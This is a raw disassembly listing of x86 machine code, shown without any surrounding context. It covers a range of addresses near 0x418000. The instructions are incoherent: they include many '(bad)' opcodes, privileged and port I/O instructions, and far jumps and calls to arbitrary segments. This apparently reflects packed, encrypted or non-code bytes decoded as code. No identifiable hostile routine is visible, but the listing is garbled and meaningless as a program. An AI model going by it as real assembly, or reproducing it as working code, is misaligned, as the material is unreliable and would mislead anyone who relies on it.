  418006:	mov    bh,0xa4
  418008:	into   
  418009:	mov    ecx,0x77df7bcc
  41800e:	mov    ecx,0x63a789ed
  418013:	lods   eax,DWORD PTR ds:[esi]
  418014:	outs   dx,DWORD PTR ds:[esi]
  418015:	mov    esi,DWORD PTR [eax+0x2eb502a1]
  41801b:	inc    esi
  41801c:	das    
  41801d:	(bad)  
  41801e:	mov    cl,0x3e
  418020:	pop    edi
  418021:	lahf   
  418022:	dec    esp
  418023:	pop    esi
  418024:	test   al,0x1e
  418026:	or     DWORD PTR [esi],ebp
  418028:	xor    eax,0xcfde513b
  41802d:	popf   
  41802e:	out    dx,eax
  41802f:	inc    ebp
  418030:	(bad)  
  418031:	iret   
  418032:	enter  0x1ba4,0x46
  418036:	out    0xfd,eax
  418038:	loopne 0x41809e
  41803a:	pop    esi
  41803b:	pushf  
  41803c:	sti    
  41803d:	in     al,dx
  41803e:	std    
  41803f:	out    dx,al
  418040:	or     al,bh
  418042:	xchg   edx,ecx
  418044:	mov    bl,0xe2
  418046:	pop    ss
  418047:	pop    ss
  418048:	outs   dx,DWORD PTR ds:[esi]
  418049:	add    edx,0xf2de559b
  41804f:	add    BYTE PTR [eax-0x43],dh
  418052:	loop   0x418013
  418054:	into   
  418055:	outs   dx,BYTE PTR ds:[esi]
  418056:	dec    ebp
  418058:	push   ds
  418059:	jecxz  0x4180b0
  41805b:	mov    ebp,0x230fc3d7
  418060:	cmp    al,0x8
  418062:	cmc    
  418063:	ins    DWORD PTR es:[edi],dx
  418064:	test   DWORD PTR [edi],eax
  418066:	fnstenv [ecx+0x1e]
  418069:	jne    0x4180df
  41806b:	loope  0x418009
  41806d:	dec    esi
  41806e:	add    ch,BYTE PTR ds:0x96aeac7a
  418074:	(bad)  
  418075:	push   edi
  418076:	adc    eax,0x9f57a849
  41807b:	jmp    0x41806a
  41807d:	ins    BYTE PTR es:[edi],dx
  41807e:	mov    ch,0xd2
  418080:	ja     0x41805b
  418082:	pop    esi
  418083:	jno    0x41804d
  418085:	sub    ebp,DWORD PTR [esi+0xb]
  418088:	and    edi,DWORD PTR [ebp+0x6733424b]
  41808e:	loop   0x4180f0
  418090:	mov    bh,0x9
  418092:	fstp   QWORD PTR [eax-0x6d5e9156]
  418098:	ss jno 0x4180ed
  41809b:	adc    BYTE PTR [esi+0x9c8209e],al
  4180a1:	add    cl,BYTE PTR [edi+0x12]
  4180a4:	jns    0x418108
  4180a6:	lods   eax,DWORD PTR ds:[esi]
  4180a7:	test   al,0x86
  4180a9:	mov    al,BYTE PTR [ebx+ebp*1-0x6c]
  4180ad:	repnz sub BYTE PTR [ecx],dl
  4180b0:	xchg   esp,eax
  4180b1:	pop    eax
  4180b2:	xchg   esp,eax
  4180b3:	js     0x418049
  4180b5:	sbb    ah,ch
  4180b7:	dec    eax
  4180b8:	cmp    eax,0x83ac02b3
  4180bd:	popa   
  4180be:	loope  0x418088
  4180c0:	xor    eax,ebp
  4180c2:	and    BYTE PTR [edi+0xc],dh
  4180c5:	push   edx
  4180c6:	lds    esp,FWORD PTR [eax]
  4180c8:	push   edi
  4180c9:	or     al,0x7b
  4180cb:	inc    edx
  4180cc:	call   0x9f2c:0x53db4836
  4180d3:	fld    st(0)
  4180d5:	in     eax,0xb6
  4180d7:	cmp    esi,DWORD PTR [ecx]
  4180d9:	xor    esi,DWORD PTR [esi+0x745f44e8]
  4180df:	(bad)  
  4180e0:	lahf   
  4180e1:	push   ebx
  4180e2:	pop    edx
  4180e3:	into   
  4180e4:	cdq    
  4180e5:	sub    cl,BYTE PTR [edi-0x34]
  4180e8:	sbb    eax,0x5aba7b19
  4180ed:	fwait
  4180ee:	int3   
  4180ef:	jnp    0x4180b6
  4180f1:	mov    bl,BYTE PTR [edi-0x2940f574]
  4180f7:	popf   
  4180f8:	mov    dl,0xbb
  4180fa:	fistp  QWORD PTR [ebx]
  4180fc:	pop    esi
  4180fd:	lods   al,BYTE PTR ds:[esi]
  4180fe:	cmp    BYTE PTR [ebx+0x8],0x58
  418102:	pop    esp
  418103:	pop    edx
  418104:	jb     0x4180b5
  418106:	out    0x5c,al
  418108:	fst    QWORD PTR [edx-0xd21b9c9]
  41810e:	add    BYTE PTR [eax],al
  418110:	scas   eax,DWORD PTR es:[edi]
  418111:	dec    edi
  418112:	adc    ecx,esi
  418114:	or     eax,0x78c746e4
  418119:	sub    eax,0x3fc015c7
  41811e:	cmp    al,0xb2
  418120:	repnz daa 
  418122:	inc    eax
  418123:	sbb    eax,0xaa3b0e3f
  418128:	test   al,0x8b
  41812a:	cmp    eax,0xaabd3e54
  41812f:	mov    cl,BYTE PTR [ebp-0x53]
  418132:	push   es
  418133:	push   0xe5fcff3d
  418138:	icebp  
  418139:	aad    0xb
  41813b:	mov    ebp,0xe2fda7f7
  418140:	frstor [edx-0xc]
  418143:	sar    DWORD PTR [eax+0x15d01c12],0x75
  41814a:	enter  0x37d4,0xeb
  41814e:	stos   BYTE PTR es:[edi],al
  41814f:	mov    dh,0x49
  418151:	mov    ch,0x61
  418153:	test   eax,0x13548755
  418158:	sbb    BYTE PTR [ebx+0x8a3c63a],ch
  41815e:	jecxz  0x418163
  418160:	inc    edx
  418161:	add    dl,BYTE PTR [edx+ebx*4]
  418164:	push   eax
  418165:	or     al,0xca
  418167:	imul   esi,eax,0x2941bc1e
  41816d:	test   DWORD PTR [ebx+0x70],eax
  418170:	into   
  418171:	adc    DWORD PTR [edi+0x18],0x25
  418175:	add    BYTE PTR [edx+0x79],0x43
  418179:	and    dh,BYTE PTR [ebx-0x78]
  41817c:	mov    WORD PTR [esi+0x3de70798],?
  418182:	dec    edx
  418183:	inc    eax
  418184:	imul   ecx,DWORD PTR ds:0xaca91de,0x95a1e96
  41818e:	into   
  41818f:	in     eax,0x38
  418191:	xchg   ebp,eax
  418192:	shl    esp,cl
  418194:	xor    bh,bh
  418196:	jecxz  0x41817f
  418198:	xchg   edi,eax
  418199:	icebp  
  41819a:	inc    ebx
  41819b:	rol    BYTE PTR [ecx+0xbc8a3c1],1
  4181a1:	or     edx,DWORD PTR [esi]
  4181a3:	out    dx,eax
  4181a4:	pushf  
  4181a5:	imul   esp,DWORD PTR [ebx-0x1b],0xffffffac
  4181a9:	push   cs
  4181aa:	cld    
  4181ab:	sub    DWORD PTR [ecx],ecx
  4181ad:	cmc    
  4181ae:	mov    bl,0x53
  4181b0:	adc    esi,ecx
  4181b2:	xchg   edi,eax
  4181b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b4:	fistp  QWORD PTR [ebx]
  4181b6:	jge    0x4181f6
  4181b8:	in     eax,dx
  4181b9:	je     0x418145
  4181bb:	mov    cl,0xb0
  4181bd:	jo     0x4181bc
  4181bf:	push   esi
  4181c0:	xlat   BYTE PTR ds:[ebx]
  4181c1:	mov    edx,0xa1fcf573
  4181c6:	lahf   
  4181c7:	mov    ebp,0x2c10f1cd
  4181cc:	dec    dl
  4181ce:	sub    eax,0xca7ef840
  4181d3:	pop    ebx
  4181d4:	push   ds
  4181d5:	add    BYTE PTR [esi+0x67],bl
  4181d8:	mov    dh,0xff
  4181da:	cli    
  4181db:	std    
  4181dc:	scas   eax,DWORD PTR es:[edi]
  4181dd:	iret   
  4181de:	iret   
  4181df:	mov    edi,0x2a5f4b3a
  4181e4:	mov    ebp,0xb9009c
  4181e9:	rol    BYTE PTR ds:0x55979665,cl
  4181ef:	adc    DWORD PTR [edx+edi*4],eax
  4181f2:	mov    ch,0x68
  4181f4:	int3   
  4181f5:	test   DWORD PTR [edi],edx
  4181f7:	das    
  4181f8:	(bad)  
  4181f9:	pop    edi
  4181fa:	cmp    bl,bl
  4181fc:	stc    
  4181fd:	mov    al,0xcd
  4181ff:	fdivr  QWORD PTR [ebp-0x2d105b9f]
  418205:	mov    ch,0xe8
  418207:	pop    ebp
  418208:	mov    edx,0x3413dad1
  41820d:	aaa    
  41820e:	test   al,0x8d
  418210:	adc    eax,0xa60bc734
  418215:	jmp    0x848:0x5456aa8e
  41821c:	or     BYTE PTR [ecx],dh
  41821e:	dec    esi
  41821f:	loope  0x418272
  418221:	add    al,0x12
  418223:	and    DWORD PTR [eax+0x70],edi
  418226:	or     cl,BYTE PTR [ebp+0x28419447]
  41822c:	adc    eax,0xef782f19
  418231:	dec    ebx
  418232:	in     al,0xf1
  418234:	and    BYTE PTR [esi+0x21],bl
  418237:	and    ch,BYTE PTR [eax]
  418239:	xor    al,0x0
  41823b:	adc    DWORD PTR [ebx+0x18],edx
  41823e:	mov    DWORD PTR [eax+0x78],esi
  418241:	pushf  
  418242:	ja     0x4182bc
  418244:	out    dx,eax
  418245:	push   ecx
  418246:	mov    ds:0xe5147870,al
  41824b:	ins    DWORD PTR es:[edi],dx
  41824c:	and    BYTE PTR [edx-0x70d4befe],bl
  418252:	or     BYTE PTR [eax],bl
  418254:	xor    DWORD PTR [edi*8-0x29c03080],ecx
  41825b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41825c:	mov    bl,0x55
  41825e:	nop
  41825f:	in     eax,0xe0
  418261:	inc    ebp
  418262:	xchg   ecx,eax
  418263:	out    0x1e,eax
  418265:	mov    esp,0xf38f3bc7
  41826a:	push   ds
  41826b:	mov    cl,0x82
  41826d:	cmc    
  41826e:	and    eax,DWORD PTR [ecx+ebp*1-0x68]
  418272:	pop    ss
  418273:	xchg   ecx,eax
  418274:	arpl   WORD PTR [ecx-0x5e],ax
  418277:	lahf   
  418278:	scas   al,BYTE PTR es:[edi]
  418279:	xor    eax,0x1f4f1fcd
  41827e:	test   al,0x9d
  418280:	mov    DWORD PTR [ebx+0x51c6ef28],ecx
  418286:	xor    DWORD PTR [ecx+0x6fbc5fa7],edi
  41828c:	jbe    0x418244
  41828e:	js     0x418220
  418290:	pop    ebx
  418291:	faddp  st(1),st
  418293:	test   DWORD PTR [ebx-0x22],0x3af000d2
  41829a:	xchg   esp,eax
  41829b:	jmp    0x596a:0xfebc5cbe
  4182a2:	std    
  4182a3:	sub    ebp,DWORD PTR [edi+0x3f720a3d]
  4182a9:	jo     0x4182ad
  4182ab:	in     al,0xd4
  4182ad:	jns    0x418283
  4182af:	shr    BYTE PTR [edi+0x44a6419a],0x5
  4182b6:	dec    edx
  4182b7:	lods   eax,DWORD PTR ds:[esi]
  4182b8:	mov    ah,0x5b
  4182ba:	out    0xf9,al
  4182bc:	daa    
  4182bd:	pop    edx
  4182be:	out    dx,eax
  4182bf:	sbb    ch,BYTE PTR [ebp+eiz*2+0xf]
  4182c3:	test   al,0xc0
  4182c5:	fcom   QWORD PTR [edi]
  4182c7:	xlat   BYTE PTR ds:[ebx]
  4182c8:	xor    bh,0xea
  4182cb:	data16 sti 
  4182cd:	pusha  
  4182ce:	xor    BYTE PTR [esi-0x3f8d92b6],bh
  4182d4:	in     al,dx
  4182d5:	cmp    BYTE PTR [esp+edx*8+0x35],cl
  4182d9:	mov    cl,0x8f
  4182db:	dec    eax
  4182dc:	jl     0x418262
  4182de:	inc    edi
  4182df:	shr    BYTE PTR [edx],0x34
  4182e2:	or     ch,ch
  4182e4:	cmp    eax,0x50a2051a
  4182e9:	mov    ss,WORD PTR [edx-0x5f]
  4182ec:	mov    ebp,0x81ce3c02
  4182f1:	push   ecx
  4182f2:	sbb    ch,BYTE PTR [edi+0x4b]
  4182f5:	test   DWORD PTR [esi-0x5c],esp
  4182f8:	jmp    0x20d2:0x94138082
  4182ff:	or     ah,BYTE PTR [edi+0x1d]
  418302:	mov    cl,0x4c
  418304:	popa   
  418305:	xchg   esp,eax
  418306:	es mov ch,0x96
  418309:	lds    ebp,FWORD PTR [ebp+0x4fb4cd9c]
  41830f:	xor    eax,0x9aac612
  418314:	add    ebp,ebx
  418316:	enter  0x8cf3,0x81
  41831a:	mov    bh,0x28
  41831c:	xor    esp,DWORD PTR [esi+ecx*1]
  41831f:	sub    ebx,DWORD PTR [eax]
  418321:	add    al,0xa3
  418323:	xor    al,0x19
  418325:	xchg   esi,eax
  418326:	daa    
  418327:	dec    edi
  418328:	js     0x4182f8
  41832a:	sahf   
  41832b:	sbb    al,0x52
  41832d:	ins    DWORD PTR es:[edi],dx
  41832e:	push   esi
  41832f:	push   eax
  418330:	add    DWORD PTR [esi],0x2db91431
  418336:	push   ebx
  418337:	add    eax,0x2097c04e
  41833c:	add    BYTE PTR ds:0x5739c0ef,0x7a
  418343:	pop    ss
  418344:	(bad)  
  418345:	loope  0x418374
  418347:	cmp    BYTE PTR [edx],0x17
  41834a:	push   es
  41834b:	out    dx,al
  41834c:	test   eax,0xeafe0a30
  418351:	rol    BYTE PTR [edi],1
  418353:	jmp    0x55b7:0xbd5dec7f
  41835a:	fs inc ebp
  41835c:	mov    ch,0x13
  41835e:	adc    al,0x5b
  418360:	lahf   
  418361:	call   0xb7f0:0x87a7ffcc
  418368:	cmp    al,0x83
  41836a:	out    dx,eax
  41836b:	lea    edi,[ebp+eiz*4+0x555e0001]
  418372:	mov    edx,0xde14daef
  418377:	lea    ecx,[edx+0x31cb5e75]
  41837d:	cmp    BYTE PTR [edx],cl
  41837f:	xchg   edx,eax
  418380:	pushf  
  418381:	inc    eax
  418382:	test   BYTE PTR cs:[edi-0x5c],ah
  418386:	sbb    ebx,DWORD PTR [edi]
  418388:	push   esp
  418389:	es pop eax
  41838b:	push   esi
  41838c:	mov    ecx,ebx
  41838e:	inc    esp
  41838f:	sbb    eax,0x3d4e89db
  418394:	mov    esi,0xc7419efe
  418399:	jge    0x4183c7
  41839b:	lods   al,BYTE PTR ds:[esi]
  41839c:	add    al,0xef
  41839e:	ror    DWORD PTR ds:0xb13511fb,1
  4183a4:	aam    0xac
  4183a6:	dec    esi
  4183a7:	je     0x418341
  4183a9:	cdq    
  4183aa:	jno    0x4183f8
  4183ac:	(bad)  
  4183ad:	or     al,0x89
  4183af:	invd   
  4183b1:	jge    0x41833b
  4183b3:	jbe    0x4183f6
  4183b5:	jmp    0xbc82ff50
  4183ba:	inc    edx
  4183bb:	loope  0x4183ee
  4183bd:	dec    esi
  4183be:	adc    BYTE PTR [edx+ecx*1],bh
  4183c1:	lea    eax,[esi]
  4183c3:	mov    esp,0x7b72a5f3
  4183c8:	mov    al,0x78
  4183ca:	pushf  
  4183cb:	sub    ebp,DWORD PTR ds:0x8163c2bd
  4183d1:	nop
  4183d2:	adc    BYTE PTR [ebp+0x7885780c],ch
  4183d8:	xor    BYTE PTR [edx],ah
  4183da:	cmp    bh,ch
  4183dc:	icebp  
  4183dd:	add    cl,dh
  4183df:	xchg   edi,eax
  4183e0:	(bad)  
  4183e1:	mov    ds,esp
  4183e3:	add    al,0xb
  4183e5:	jmp    0x41837d
  4183e7:	pop    ss
  4183e8:	into   
  4183e9:	scas   eax,DWORD PTR es:[edi]
  4183ea:	mov    bl,0x95
  4183ec:	or     ebp,esi
  4183ee:	sbb    BYTE PTR [eax+ebx*1-0x10cdee8e],bl
  4183f5:	pop    ecx
  4183f6:	fbstp  TBYTE PTR [esp+esi*4+0x18743337]
  4183fd:	push   edx
  4183fe:	test   eax,0x4161d219
  418403:	cmp    dl,al
  418405:	cmp    bh,ah
  418407:	test   eax,0x26d46b37
  41840c:	sub    cl,BYTE PTR [edi+eax*4]
  41840f:	xchg   esi,eax
  418410:	ret    0xe096
  418413:	mov    bl,0xd
  418415:	inc    edx
  418416:	clc    
  418417:	repnz xor al,0xba
  41841a:	rol    BYTE PTR [ebx],cl
  41841c:	sar    BYTE PTR [ecx-0x3f],0xbb
  418420:	sar    DWORD PTR [ebp+0x7],1
  418423:	pop    eax
  418424:	(bad)  
  418425:	mov    bl,0x1e
  418427:	out    dx,eax
  418428:	add    eax,0xe18d360a
  41842d:	fild   DWORD PTR [ecx+0x45]
  418430:	push   ds
  418431:	cmp    DWORD PTR [eax-0x5c],esi
  418434:	(bad)  
  418435:	out    dx,eax
  418436:	ret    0xd924
  418439:	sbb    al,0x44
  41843b:	std    
  41843c:	ins    BYTE PTR es:[edi],dx
  41843d:	jmp    0xfb99:0xf9b86b5c
  418444:	in     eax,dx
  418445:	outs   dx,DWORD PTR ds:[esi]
  418446:	ret    
  418447:	lods   eax,DWORD PTR ds:[esi]
  418448:	int3   
  418449:	ret    0x281b
  41844c:	outs   dx,DWORD PTR ds:[esi]
  41844d:	sbb    DWORD PTR [eax],eax
  41844f:	mov    eax,0xabea5951
  418454:	lock add BYTE PTR [esi+0x46],ch
  418458:	leave  
  418459:	outs   dx,DWORD PTR ds:[esi]
  41845a:	push   ss
  41845b:	add    BYTE PTR [esi-0x41294a38],ch
  418461:	cmp    eax,0xde9faf3f
  418466:	or     BYTE PTR [esp+0x6ca7681],dl
  41846d:	(bad)  
  41846f:	retf   
  418470:	dec    ebx
  418471:	ja     0x41846a
  418473:	cmp    al,bl
  418475:	pop    ds
  418476:	or     al,0xaa
  418478:	rol    DWORD PTR [edi],1
  41847a:	je     0x41849f
  41847c:	call   FWORD PTR [eax+0x1b5cb89a]
  418482:	lahf   
  418483:	in     al,dx
  418484:	mov    bl,0x73
  418486:	ret    0x2471
  418489:	jl     0x4184a2
  41848b:	cmp    DWORD PTR [eax-0x32],esi
  41848e:	mov    esi,0x22624d40
  418493:	or     DWORD PTR [eax],ecx
  418495:	sub    BYTE PTR [ebp+0x51682f15],dl
  41849b:	push   0x1c478504
  4184a0:	push   0x4fa350af
  4184a5:	pop    edi
  4184a6:	add    BYTE PTR [ecx-0x29de2570],0x39
  4184ad:	inc    esp
  4184ae:	sub    al,0xae
  4184b0:	dec    eax
  4184b1:	push   ecx
  4184b2:	bound  esi,QWORD PTR [eax]
  4184b4:	push   esp
  4184b5:	mov    BYTE PTR [ebx-0xd7c21da],al
  4184bb:	loopne 0x418451
  4184bd:	lds    ebx,FWORD PTR [ecx-0x71]
  4184c0:	push   ecx
  4184c1:	sbb    ch,bl
  4184c3:	sbb    al,0x5a
  4184c5:	adc    al,0xca
  4184c7:	imul   edx,DWORD PTR [eax+0x6],0xffffff9b
  4184cb:	sub    DWORD PTR [esi],ebp
  4184cd:	sub    eax,0xa6b5a16e
  4184d2:	aas    
  4184d3:	hlt    
  4184d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184d5:	mov    ebp,0xc7349d21
  4184da:	push   ss
  4184db:	sahf   
  4184dc:	mov    eax,ds:0xb03a5615
  4184e1:	pop    ecx
  4184e2:	dec    esp
  4184e3:	nop
  4184e4:	aam    0xaa
  4184e6:	cwde   
  4184e7:	shl    BYTE PTR [eax+0xc0e8d02],0x4a
  4184ee:	or     eax,ebx
  4184f0:	mov    eax,ds:0x463b9865
  4184f5:	push   ebp
  4184f6:	add    ah,BYTE PTR [ebp-0x7f]
  4184f9:	adc    BYTE PTR [edi-0x77ff4ece],0x2f
  418500:	das    
  418501:	xchg   edi,eax
  418502:	mul    DWORD PTR [ebx-0x3fff7369]
  418508:	jnp    0x418499
  41850a:	das    
  41850b:	add    al,0x5c
  41850d:	sbb    DWORD PTR [ecx],esp
  41850f:	clc    
  418510:	adc    BYTE PTR [ecx-0x28],0xe0
  418514:	cmp    al,BYTE PTR [esi-0x35]
  418517:	jecxz  0x41857a
  418519:	mov    ds:0x43e07abf,al
  41851e:	arpl   di,di
  418520:	mov    edx,0xd669e499
  418525:	pushf  
  418526:	retf   0xb5df
  418529:	mov    ebx,0xdc127c31
  41852e:	outs   dx,DWORD PTR ds:[esi]
  41852f:	mov    edi,eax
  418531:	(bad)
  418534:	pop    ebx
  418535:	pusha  
  418536:	lock cmp cl,dl
  418539:	pop    ebx
  41853a:	push   es
  41853b:	add    BYTE PTR [esi-0x916a869],ch
  418541:	pop    edi
  418542:	verw   WORD PTR [edi+0xa3fe589]
  418549:	sar    BYTE PTR [ebx+esi*2],cl
  41854c:	inc    esi
  41854d:	sbb    eax,0x6e6a4633
  418552:	shr    BYTE PTR [ebx+ebx*8],cl
  418555:	pop    esp
  418556:	cmc    
  418557:	(bad)  
  418559:	out    0xc2,al
  41855b:	jns    0x418598
  41855d:	jno    0x418540
  41855f:	shl    dh,cl
  418561:	(bad)  
  418562:	mov    al,ds:0x91b587f4
  418567:	(bad)  
  418568:	pop    ss
  418569:	loope  0x41853d
  41856b:	lods   al,BYTE PTR ds:[esi]
  41856c:	cdq    
  41856d:	fsub   DWORD PTR [edx-0x19]
  418570:	out    dx,al
  418571:	cwde   
  418572:	jmp    0x9d0d:0x179b2770
  418579:	jle    0x41851a
  41857b:	icebp  
  41857c:	sbb    DWORD PTR [ebp-0x22],0x33
  418580:	shl    esp,cl
  418582:	ins    BYTE PTR es:[edi],dx
  418583:	inc    BYTE PTR [edx]
  418585:	push   ebx
  418586:	xchg   ebp,eax
  418587:	cmp    ah,bl
  418589:	cmp    al,ah
  41858b:	clc    
  41858c:	add    ah,BYTE PTR [ebx-0x7bfb4bfd]
  418592:	xchg   esp,eax
  418593:	xor    DWORD PTR [ebx],edi
  418595:	push   ds
  418596:	mov    ah,0x13
  418598:	mov    ah,0x8
  41859a:	xchg   esi,eax
  41859b:	xor    dl,dh
  41859d:	push   ss
  41859e:	out    0xc9,eax
  4185a0:	mov    esp,DWORD PTR [ecx]
  4185a2:	cdq    
  4185a3:	dec    ebp
  4185a4:	leave  
  4185a5:	ins    DWORD PTR es:[edi],dx
  4185a6:	xor    DWORD PTR [esi+0x16],0x1061112d
  4185ad:	adc    ebp,DWORD PTR [eax-0x39e72a06]
  4185b3:	cmp    DWORD PTR [edx],ecx
  4185b5:	xchg   edi,eax
  4185b6:	adc    ebp,DWORD PTR [eax-0x7dfebee8]
  4185bc:	push   edx
  4185bd:	push   es
  4185be:	and    eax,0x1158d4a6
  4185c3:	mov    esp,0x8c1d1873
  4185c8:	dec    eax
  4185c9:	inc    eax
  4185ca:	xchg   DWORD PTR [eax],ecx
  4185cc:	in     al,0xb9
  4185ce:	jecxz  0x418592
  4185d0:	push   edx
  4185d1:	mov    edx,ebp
  4185d3:	push   esi
  4185d4:	(bad)  
  4185d5:	cld    
  4185d6:	push   esi
  4185d7:	test   DWORD PTR [esi+0x6a],ecx
  4185da:	call   0xa620a9a
  4185df:	test   eax,0xa9a4278d
  4185e4:	and    ecx,ebx
  4185e6:	fst    QWORD PTR [ebp+0x37]
  4185e9:	dec    eax
  4185ea:	dec    edx
  4185eb:	lds    ebp,FWORD PTR [esi]
  4185ed:	aas    
  4185ee:	sahf   
  4185ef:	xchg   esp,eax
  4185f0:	inc    ebp
  4185f1:	out    0x23,al
  4185f3:	lds    ebp,FWORD PTR [edi]
  4185f5:	jge    0x41860e
  4185f7:	jg     0x4185be
  4185f9:	xor    esi,eax
  4185fb:	and    eax,ebp
  4185fd:	(bad)  
  4185fe:	mov    es,eax
  418600:	ror    BYTE PTR [ecx],0xd6
  418603:	cmp    edx,DWORD PTR [ebx+edx*1+0x168f5bc]
  41860a:	lods   al,BYTE PTR ds:[esi]
  41860b:	pop    ebx
  41860c:	rol    BYTE PTR [esi+0x3d],cl
  41860f:	push   ss
  418610:	xlat   BYTE PTR ds:[ebx]
  418611:	int    0x9f
  418613:	fdivr  QWORD PTR [esi-0x1]
  418616:	fcomp  DWORD PTR [edi-0x4b4a3c99]
  41861c:	push   ss
  41861d:	fabs   
  41861f:	shl    DWORD PTR [eax],1
  418621:	int3   
  418622:	mov    edi,0xbb88e470
  418627:	in     eax,0x15
  418629:	mov    esp,0x396f23e
  41862e:	cmp    BYTE PTR [edi+0x4af7e921],0x31
  418635:	(bad)  
  418636:	ja     0x41865b
  418638:	neg    BYTE PTR [esi-0x2a]
  41863b:	pop    ebx
  41863c:	sub    BYTE PTR ds:0x6b36751f,dl
  418642:	stos   DWORD PTR es:[edi],eax
  418643:	jbe    0x4186aa
  418645:	inc    ebx
  418646:	ja     0x418645
  418648:	dec    esp
  418649:	push   eax
  41864a:	nop
  41864b:	xchg   BYTE PTR [edi+0x7becf97f],cl
  418651:	mov    ebx,0x250fd95b
  418656:	int    0xe4
  418658:	mov    ds:0xfde0fec3,eax
  41865d:	or     DWORD PTR [esi-0x69],0xffffffde
  418661:	inc    esi
  418662:	sbb    ebp,ebx
  418664:	push   es
  418665:	dec    esp
  418666:	dec    ebp
  418667:	es xor al,0xaa
  41866a:	or     DWORD PTR [ebp-0x55],ebx
  41866d:	jo     0x4186b9
  41866f:	inc    ebx
  418670:	fsubrp st(5),st
  418672:	adc    ebp,edi
  418674:	stos   DWORD PTR es:[edi],eax
  418675:	mov    al,0xde
  418677:	cmp    al,0x46
  418679:	xchg   esp,eax
  41867a:	push   esp
  41867b:	fstp   DWORD PTR [ecx+0x18b0a38c]
  418681:	outs   dx,DWORD PTR ds:[esi]
  418682:	or     DWORD PTR [ecx+eax*8+0x63a04048],esi
  418689:	xchg   esp,eax
  41868a:	add    eax,0x15ef10cf
  41868f:	imul   ebx,DWORD PTR [esi+0x47831b13],0x39c38523
  418699:	mov    esi,DWORD PTR [ebp-0x4bf2defb]
  41869f:	xlat   BYTE PTR ds:[ebx]
  4186a0:	test   BYTE PTR [ecx+0x1d],al
  4186a3:	(bad)  
  4186a4:	shr    BYTE PTR ds:0x9ef385a,1
  4186aa:	sar    BYTE PTR [eax+0x6f],1
  4186ad:	or     DWORD PTR [esp+ecx*2-0x60],esi
  4186b1:	xchg   ebx,eax
  4186b2:	xor    ah,BYTE PTR [eax+edx*1-0x6b8fbd73]
  4186b9:	mov    cl,0xba
  4186bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186bc:	in     al,0x11
  4186be:	mov    ah,0x52
  4186c0:	in     al,0xce
  4186c2:	ret    
  4186c3:	dec    eax
  4186c4:	ja     0x41865b
  4186c6:	pop    ss
  4186c7:	lods   al,BYTE PTR ds:[esi]
  4186c8:	sub    edx,DWORD PTR [eax-0x5e]
  4186cb:	adc    BYTE PTR [ebx+0x5a77caf9],ah
  4186d1:	sub    al,0xb4
  4186d3:	pusha  
  4186d4:	mov    ch,0x57
  4186d6:	mov    eax,ds:0xae255131
  4186db:	lds    ecx,FWORD PTR [esi+eax*4]
  4186de:	xchg   esi,eax
  4186df:	bound  edx,QWORD PTR [edi+edx*8]
  4186e2:	jnp    0x4186eb
  4186e4:	mov    BYTE PTR [ebx],ch
  4186e6:	std    
  4186e7:	adc    eax,0x654a5e0f
  4186ec:	fiadd  WORD PTR [esi]
  4186ee:	add    cl,BYTE PTR [edi]
  4186f0:	js     0x4186f7
  4186f2:	loopne 0x418705
  4186f4:	scas   eax,DWORD PTR es:[edi]
  4186f5:	jo     0x41868b
  4186f7:	mov    esp,0x50cae00
  4186fc:	mov    esp,0x804924f5
  418701:	sub    ebx,DWORD PTR [eax+ebx*2]
  418704:	dec    edi
  418705:	ds int3 
  418707:	jno    0x41871f
  418709:	pushf  
  41870a:	repz sbb BYTE PTR [ebp-0x16ef872],ch
  418711:	jmp    0x1c73:0xff2bfbbe
  418718:	(bad)  
  418719:	ss aad 0xea
  41871c:	(bad)  
  41871d:	lock aam 0xe1
  418720:	xor    ch,bh
  418722:	mov    ebp,0x2decfb7d
  418727:	and    BYTE PTR [eax+0x6d],bh
  41872a:	repnz xchg esi,eax
  41872c:	add    BYTE PTR [eax-0x2209b729],al
  418732:	dec    eax
  418733:	xchg   ecx,eax
  418734:	pop    edi
  418735:	push   ebp
  418736:	or     BYTE PTR [eax+0x1c],dh
  418739:	push   esp
  41873a:	je     0x418742
  41873c:	pop    ecx
  41873d:	cmp    eax,0xb67b3a88
  418742:	lods   eax,DWORD PTR ds:[esi]
  418743:	sti    
  418744:	xor    DWORD PTR [esp+ebx*1],0xfffffff4
  418748:	pop    edx
  418749:	icebp  
  41874a:	rol    edi,1
  41874c:	pop    edx
  41874d:	aas    
  41874e:	in     al,0xb5
  418750:	inc    BYTE PTR [esi+ebp*4+0x61729fe5]
  418757:	jnp    0x4186ff
  418759:	jnp    0x41870c
  41875b:	inc    edi
  41875c:	imul   eax,ecx,0x11
  41875f:	inc    esp
  418760:	arpl   WORD PTR [ecx+eiz*4],ax
  418763:	(bad)  
  418764:	push   ecx
  418765:	push   eax
  418766:	scas   eax,DWORD PTR es:[edi]
  418767:	imul   ebx,DWORD PTR [edx+0x5af19a93],0x41
  41876e:	imul   edi,DWORD PTR ds:0xf9c92c65,0xffffffc4
  418775:	add    ebx,DWORD PTR [ecx]
  418777:	push   ecx
  418778:	cmp    BYTE PTR [ebx+0x35],al
  41877b:	cwde   
  41877c:	inc    esp
  41877d:	xor    al,0xe0
  41877f:	mov    dl,0x32
  418781:	inc    edi
  418782:	(bad)  
  418783:	daa    
  418784:	push   ebx
  418785:	sbb    eax,0xdb926c06
  41878a:	cs into 
  41878c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41878d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41878e:	push   ss
  41878f:	mov    WORD PTR [eax+0x0],es
  418792:	adc    al,0xce
  418794:	jecxz  0x418732
  418796:	and    DWORD PTR [esi],esp
  418798:	and    edx,esi
  41879a:	cmp    ecx,eax
  41879c:	pop    esp
  41879d:	setno  BYTE PTR [eax-0x528b7924]
  4187a4:	shl    DWORD PTR [esi+0x6d],0xc2
  4187a8:	shl    BYTE PTR [eax],1
  4187aa:	push   ds
  4187ab:	push   ebp
  4187ac:	or     BYTE PTR [eax+eax*1],ah
  4187af:	cmp    al,0x5a
  4187b1:	sbb    ebx,DWORD PTR [ebx+esi*4-0x7df72e98]
  4187b8:	repz loopne 0x4187ff
  4187bb:	mov    eax,ds:0x2f563b64
  4187c0:	std    
  4187c1:	js     0x4187e8
  4187c3:	or     dl,BYTE PTR [ecx+0x65]
  4187c6:	int3   
  4187c7:	cs push ds
  4187c9:	cmp    al,0xbe
  4187cb:	in     al,0x12
  4187cd:	mov    al,0x9c
